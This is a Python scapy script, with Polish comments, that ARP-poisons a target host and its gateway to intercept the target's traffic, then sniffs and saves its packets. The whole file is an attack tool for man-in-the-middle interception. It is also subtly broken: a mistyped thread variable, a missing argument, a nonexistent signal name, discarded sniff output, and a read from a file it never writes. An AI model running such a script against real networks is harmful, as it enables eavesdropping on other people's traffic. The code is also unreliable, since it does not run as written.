from scapy.all import *
from time import sleep
import os
import sys
from threading import Thread

INTERFACE = 'eth0'
TARGET_IP = '172.26.1.11'
GATEWAY_IP = '172.26.1.1'
count = 1000

conf.iface = INTERFACE
conf.verb = 0

#---------------Funckje-----------------
def get_mac(ip):
    ans, uans = send(Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(pdst=ip))
    for s, r in ans:
        return r[Ether].src

def poison_attack(gateway_ip, gateway_mac, target_ip, target_mac):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    while True:
        try:
            send(poison_target)
            send(poison_gateway)
            sleep(2)
            print(f"*** UDANY ATACK NA {target_ip} oraz brame {gateway_ip} ***")

        except KeyboardInterrupt:
            restore_defaults(gateway_ip, gateway_mac, target_ip, target_mac)
    print("Atack zakoczony")
    


def restore_defaults(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst="FF:FF:FF:FF:FF:FF", hwsrc=gateway_mac), count=5)
    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst="FF:FF:FF:FF:FF:FF", hwsrc=target_mac), count=5)

    os.kill(os.getpid(), sys.SIGINIT)


TARGET_MAC = get_mac(TARGET_IP)
GATEWAY_MAC = get_mac(GATEWAY_IP)

# main
posion_thread = Thread(target=poison_attack, args=(GATEWAY_IP, GATEWAY_MAC, TARGET_IP))
poison_thread.start()


bpf_filter = f"ip host {TARGET_IP}"


sniff(filter=bpf_filter, count=count)
pcap = rdpcap("./capture.pcap")

wrpcap("arp.pcap", pcap)
